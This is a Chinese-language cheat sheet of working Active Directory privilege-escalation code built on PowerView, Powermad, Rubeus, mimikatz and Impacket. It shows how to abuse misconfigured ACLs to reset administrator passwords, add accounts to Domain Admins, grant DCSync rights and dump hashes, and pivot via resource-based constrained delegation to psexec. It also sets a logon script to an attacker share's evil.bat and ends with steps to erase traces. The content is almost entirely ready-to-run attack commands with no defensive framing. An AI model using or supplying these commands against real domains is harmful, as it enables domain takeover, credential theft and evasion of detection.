# AD权限滥用代码详解

## 1. PowerView枚举DACL

### 枚举用户对象的ACL
```powershell
# 导入PowerView
Import-Module .\PowerView.ps1

# 枚举特定用户的ACL
Get-ObjectAcl -Identity "targetuser" -ResolveGUIDs

# 枚举当前用户对所有用户的权限
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {
    $_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force
    $_
} | Foreach-Object {
    if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {
        $_
    }
}
```

### 枚举计算机对象的ACL
```powershell
# 枚举当前用户对计算机对象的权限
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {
    $_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force
    $_
} | Foreach-Object {
    if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {
        $_
    }
}
```

### 查找特定权限
```powershell
# 查找GenericAll权限
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "GenericAll"
}

# 查找WriteDACL权限
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "WriteDacl"
}

# 查找WriteProperty权限
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "WriteProperty"
}
```

## 2. GenericAll权限滥用

### 对用户对象的GenericAll
```powershell
# 场景: 当前用户对targetuser有GenericAll权限

# 方法1: 重置密码
$newPassword = ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force
Set-DomainUserPassword -Identity targetuser -AccountPassword $newPassword

# 方法2: 设置SPN进行Kerberoasting
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/spn'}

# 然后进行Kerberoasting
Get-DomainSPNTicket -Identity targetuser

# 方法3: 添加到组
Add-DomainGroupMember -Identity "Domain Admins" -Members targetuser
```

### 对组对象的GenericAll
```powershell
# 场景: 当前用户对某个组有GenericAll权限

# 将自己添加到该组
Add-DomainGroupMember -Identity "TargetGroup" -Members $env:Username

# 验证
Get-DomainGroupMember -Identity "TargetGroup"
```

### 对计算机对象的GenericAll
```powershell
# 场景: 当前用户对计算机对象有GenericAll权限
# 可以配置RBCD进行攻击

# 获取计算机SID
$ComputerSid = Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid

# 创建安全描述符
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

# 设置RBCD
Get-DomainComputer -Identity targetcomputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

## 3. WriteDACL权限滥用

### 添加GenericAll权限
```powershell
# 场景: 当前用户对targetuser有WriteDACL权限

# 为自己添加GenericAll权限
Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity $env:Username -Rights All

# 验证
Get-ObjectAcl -Identity targetuser -ResolveGUIDs | Where-Object {
    $_.SecurityIdentifier -eq (Get-DomainUser -Identity $env:Username).objectsid
}

# 现在可以重置密码
$newPassword = ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force
Set-DomainUserPassword -Identity targetuser -AccountPassword $newPassword
```

### 添加DCSync权限
```powershell
# 场景: 对域对象有WriteDACL权限

# 为自己添加DCSync权限
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=com" -PrincipalIdentity $env:Username -Rights DCSync

# 执行DCSync
mimikatz # lsadump::dcsync /domain:corp.com /user:Administrator
```

## 4. WriteProperty权限滥用

### 修改用户属性
```powershell
# 修改scriptPath (登录脚本)
Set-DomainObject -Identity targetuser -Set @{scriptpath='\\attacker\share\evil.bat'}

# 修改profilePath
Set-DomainObject -Identity targetuser -Set @{profilepath='\\attacker\share\profile'}

# 修改homeDirectory
Set-DomainObject -Identity targetuser -Set @{homedirectory='\\attacker\share\home'}
```

### 修改组成员
```powershell
# 如果对组的member属性有WriteProperty权限
# 可以添加成员
Add-DomainGroupMember -Identity "TargetGroup" -Members $env:Username
```

## 5. RBCD攻击完整代码

### 使用Powermad创建计算机账户
```powershell
# 导入Powermad
Import-Module .\Powermad.ps1

# 检查机器账户配额
Get-DomainObject -Identity "DC=corp,DC=com" -Properties ms-DS-MachineAccountQuota

# 创建计算机账户
New-MachineAccount -MachineAccount myComputer -Password $(ConvertTo-SecureString 'h4x' -AsPlainText -Force)

# 验证创建
Get-DomainComputer -Identity myComputer
```

### 配置RBCD
```powershell
# 获取新计算机的SID
$sid = Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid

# 创建安全描述符
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

# 设置msds-allowedtoactonbehalfofotheridentity
Get-DomainComputer -Identity appsrv01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# 验证设置
$RBCDbytes = Get-DomainComputer appsrv01 -Properties 'msds-allowedtoactonbehalfofotheridentity' | Select -Expand msds-allowedtoactonbehalfofotheridentity
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RBCDbytes, 0
$Descriptor.DiscretionaryAcl

# 转换SID确认
ConvertFrom-SID $Descriptor.DiscretionaryAcl.SecurityIdentifier
```

### 使用Rubeus执行S4U攻击
```powershell
# 计算密码哈希
.\Rubeus.exe hash /password:h4x

# 执行S4U攻击
.\Rubeus.exe s4u /user:myComputer$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:CIFS/appsrv01.corp.com /ptt

# 验证票据
klist

# 访问目标
dir \\appsrv01.corp.com\c$
```

## 6. 使用Impacket进行RBCD攻击

### 从Linux执行RBCD攻击
```bash
# 添加计算机账户
python addcomputer.py -computer-name 'FAKE01$' -computer-pass 'Password123!' corp.com/user:password

# 配置RBCD
python rbcd.py -delegate-to 'TARGET$' -delegate-from 'FAKE01$' -action write corp.com/user:password

# 获取服务票据
python getST.py -spn cifs/TARGET.corp.com -impersonate Administrator corp.com/'FAKE01$':Password123!

# 使用票据
export KRB5CCNAME=Administrator.ccache
python psexec.py -k -no-pass corp.com/Administrator@TARGET.corp.com
```

## 8. 常见攻击路径

### GenericAll到Domain Admin
```powershell
# 1. 发现GenericAll权限
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "GenericAll" -and
    $_.SecurityIdentifier -eq (Get-DomainUser -Identity $env:Username).objectsid
}

# 2. 如果目标是Domain Admin成员
# 重置其密码
$newPassword = ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force
Set-DomainUserPassword -Identity targetadmin -AccountPassword $newPassword

# 3. 使用新密码登录
runas /user:corp\targetadmin cmd.exe
```

### WriteDACL到DCSync
```powershell
# 1. 发现WriteDACL权限
Get-DomainObjectAcl -Identity "DC=corp,DC=com" -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "WriteDacl"
}

# 2. 添加DCSync权限
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=com" -PrincipalIdentity $env:Username -Rights DCSync

# 3. 执行DCSync
mimikatz # lsadump::dcsync /domain:corp.com /all
```

### RBCD到本地管理员
```powershell
# 1. 发现对计算机的写权限
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "GenericWrite|GenericAll|WriteProperty"
}

# 2. 创建计算机账户
New-MachineAccount -MachineAccount FAKE01

# 3. 配置RBCD
# (使用上面的代码)

# 4. 获取管理员票据
.\Rubeus.exe s4u /user:FAKE01$ /rc4:HASH /impersonateuser:administrator /msdsspn:CIFS/target.corp.com /ptt

# 5. 访问目标
dir \\target.corp.com\c$
```

## 9. 清理痕迹

### 移除添加的权限
```powershell
# 移除ACL
Remove-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity $env:Username -Rights All

# 移除RBCD配置
Set-DomainObject -Identity targetcomputer -Clear 'msds-allowedtoactonbehalfofotheridentity'

# 移除添加的组成员
Remove-DomainGroupMember -Identity "TargetGroup" -Members $env:Username
```

### 删除创建的计算机账户
```powershell
# 使用AD模块
Remove-ADComputer -Identity "FAKE01"

# 或使用PowerView
# (需要适当权限)
```
